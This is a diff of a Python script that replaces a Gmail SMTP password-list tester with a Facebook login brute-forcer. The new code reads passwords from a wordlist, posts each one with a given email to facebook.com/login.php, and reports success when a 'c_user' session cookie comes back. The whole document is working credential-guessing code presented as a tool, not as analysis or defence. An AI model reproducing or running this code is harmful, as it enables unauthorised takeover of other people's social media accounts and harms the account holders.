@@ -1,52 +1,39 @@
 #!/usr/bin/env python3
-import smtplib
-import time
-import os
+import requests
+import getpass
 
-# Cosmetic animation for console
-def animate(text):
-    for char in text:
-        print(char, end='', flush=True)
-        time.sleep(0.01)
-    print()
-
-# Connect to Gmail SMTP server
-def start_smtp():
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.ehlo()
-    server.starttls()
-    return server
-
-# Test password list safely
-def test_passwords(account, password_file_path):
-    if not os.path.isfile(password_file_path):
-        print(f"[❌ ERROR] Password file '{password_file_path}' not found.")
-        return
-
-    server = start_smtp()
+def test_passwords(email, password_file):
+    success = False
     try:
-        with open(password_file_path, 'r') as f:
+        with open(password_file, 'r') as f:
             for password in f:
                 password = password.strip()
                 if not password:
                     continue
-                try:
-                    # Only works with App Passwords
-                    server.login(account, password)
-                    animate(f"[✅ SUCCESS] Password works (App Password!): {password}")
+                # POST request to Facebook login page
+                payload = {
+                    "email": email,
+                    "pass": password
+                }
+                response = requests.post("https://www.facebook.com/login.php", data=payload)
+                
+                # Check if login failed (Facebook returns 200 even if failed)
+                if "c_user" in response.cookies:
+                    print(f"[✅ SUCCESS] Password works: {password}")
+                    success = True
                     break
-                except smtplib.SMTPAuthenticationError:
-                    animate(f"[❌ FAIL] Wrong password: {password}")
-                except Exception as e:
-                    animate(f"[⚠️ ERROR] {e}")
-    finally:
-        server.quit()
+                else:
+                    print(f"[❌ FAIL] Wrong password: {password}")
+    except FileNotFoundError:
+        print(f"[❌ ERROR] Password file '{password_file}' not found.")
+    
+    if not success:
+        print("[⚠️] No valid password found.")
 
 # ===========================
-# Termux / GitHub Safe Configuration
+# User input
 # ===========================
-dummy_account = input("Enter your Gmail address (must be your account!): ").strip()
-password_file_path = input("Enter full path to your password list file: ").strip()
+email = input("Enter your Facebook email: ").strip()
+password_file = input("Enter path to your password file: ").strip()
 
-# Run the test
-test_passwords(dummy_account, password_file_path)
+test_passwords(email, password_file)
